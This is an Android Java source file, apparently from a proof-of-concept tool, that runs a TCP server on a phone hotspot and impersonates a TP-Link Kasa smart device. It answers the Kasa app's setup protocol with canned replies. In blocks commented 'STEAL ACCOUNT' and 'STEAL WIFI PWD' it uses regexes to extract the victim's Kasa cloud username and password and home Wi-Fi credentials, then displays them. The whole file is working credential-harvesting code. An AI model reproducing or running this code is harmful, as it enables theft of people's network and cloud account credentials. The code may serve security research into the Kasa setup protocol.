package com.albanrecly.wifipasswordkasa;

import android.os.AsyncTask;
import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.Arrays;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import androidx.core.content.res.TypedArrayUtils;

public class TCPServer extends AsyncTask<String, String, String> {

    @Override
    protected String doInBackground(String... strings) {
        try {
            String ssid="";
            String wifipwd="";
            String username="";
            String pwd="";
            // create ServerSocket using specified port
            ServerSocket serverSocket = new ServerSocket(Tools.PORT, 0, InetAddress.getByName("192.168.43.1"));
//            ServerSocket serverSocket = new ServerSocket(80, 0, InetAddress.getByName("192.168.43.1"));
            Tools.log("About to setup TCP server on "+serverSocket.getInetAddress()+":"+serverSocket.getLocalPort());

            Socket socket = serverSocket.accept();
            Tools.log("Received TCP connection from "+socket.getInetAddress());

            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(1024);
            byte[] buffer = new byte[1024];
            int bytesRead;
            boolean shouldBreak = false;


            OutputStream mOut = socket.getOutputStream();
            InputStream in = socket.getInputStream();


            socket.setSoTimeout(500);
            while(ssid.length() == 0 && wifipwd.length() == 0) {
                try {
                    while ((bytesRead = in.read(buffer)) != -1) {
                        byteArrayOutputStream.write(buffer, 0, bytesRead);
                    }
                } catch (SocketTimeoutException e) {/*ignored*/}
                finally {
                    String data = Tools.hexToAscii(Tools.decode(Arrays.copyOfRange(buffer, 4, buffer.length)));
                    data = data.substring(0, data.lastIndexOf("}"));
                    //TODO
                    Tools.log("TCP server Received message:");
                    Tools.log("\t" + data);

                    byte[] padding = new byte[4]; // padding is length of data

                    if(data.contains("get_scaninfo")){
                        byte[] toSend = Tools.encode(Tools.JSONanswerTCP.getBytes());
                        padding = Tools.getPadding(toSend.length);
                        byte[] answer = new byte[padding.length+toSend.length];
                        System.arraycopy(padding, 0, answer, 0, padding.length);
                        System.arraycopy(toSend, 0, answer, padding.length, toSend.length);
                        mOut.write(answer);
                    }
                    else if(data.contains("cnCloud")){
                        if(data.contains("get_info")) {
                            byte[] toSend = Tools.encode(Tools.JSONanswerTCPCloud.getBytes());
                            padding = Tools.getPadding(toSend.length);
                            byte[] answer = new byte[4 + toSend.length];
                            System.arraycopy(padding, 0, answer, 0, padding.length);
                            System.arraycopy(toSend, 0, answer, padding.length, toSend.length);
                            mOut.write(answer);
                        }
                        else if(data.contains("bind")){
                            //STEAL ACCOUNT
                            Tools.log("bind requested");
                            Tools.log(data);
                            Pattern p = Pattern.compile("username.:.[a-zA-Z0-9.@_]*.");
                            Pattern p2 = Pattern.compile("password.:.[a-zA-Z0-9.@_]*.");
                            Matcher m = p.matcher(data);
                            if(m.find()){
                                username = m.group();
                            }
                            Matcher m2 = p2.matcher(data);
                            if(m2.find()){
                                pwd = m2.group();
                            }
                        }
                    }
                    else if(data.contains("set_timezone")){
                        byte[] toSend = Tools.encode(Tools.JSONanswerTCPTimezone.getBytes());
                        padding = Tools.getPadding(toSend.length);
                        byte[] answer = new byte[4 + toSend.length];
                        System.arraycopy(padding, 0, answer, 0, padding.length);
                        System.arraycopy(toSend, 0, answer, padding.length, toSend.length);
                        mOut.write(answer);
                    }
                    else if(data.contains("set_stainfo")){
                        //STEAL WIFI PWD
                        Tools.log("sta_info");
                        Pattern p = Pattern.compile("ssid.:.[a-zA-Z0-9.@_]*.");
                        Pattern p2 = Pattern.compile("password.:.[a-zA-Z0-9.@_]*.");
                        Matcher m = p2.matcher(data);
                        if(m.find()){
                            ssid = m.group();
                        }
                        Matcher m2 = p.matcher(data);
                        if(m2.find()){
                            wifipwd = m2.group();
                        }
                        Tools.log("WIFI "+ssid+" "+wifipwd);
                        shouldBreak = true;
                    }
                    Tools.log("answer sent");
                    in.close();
                    mOut.close();
                    Thread.sleep(300);
                    socket.close();
                    if(!shouldBreak) {
                        socket = serverSocket.accept();
                        Tools.log("Received TCP connection from " + socket.getInetAddress());
                        socket.setSoTimeout(500);
                        mOut = socket.getOutputStream();
                        in = socket.getInputStream();
                    }
                }
            }
            return username+",;,"+ pwd+",;,"+ssid+",;,"+wifipwd;
        } catch (IOException e) {
            Log.e(Tools.TAG, Log.getStackTraceString(e));
        }
        catch(InterruptedException e){
            Tools.log(Log.getStackTraceString(e));
        }
        return null;
    }

    @Override
    protected void onPostExecute(String result){
        MainActivity.appendText("==== WiFi Credentials ====");
        MainActivity.appendText(result.split(",;,")[3]);
        MainActivity.appendText(result.split(",;,")[2]);
        MainActivity.appendText("========================");

        MainActivity.appendText("==== Kasa Credentials ====");
        MainActivity.appendText(result.split(",;,")[0]);
        MainActivity.appendText(result.split(",;,")[1]);
        MainActivity.appendText("========================");
    }
}
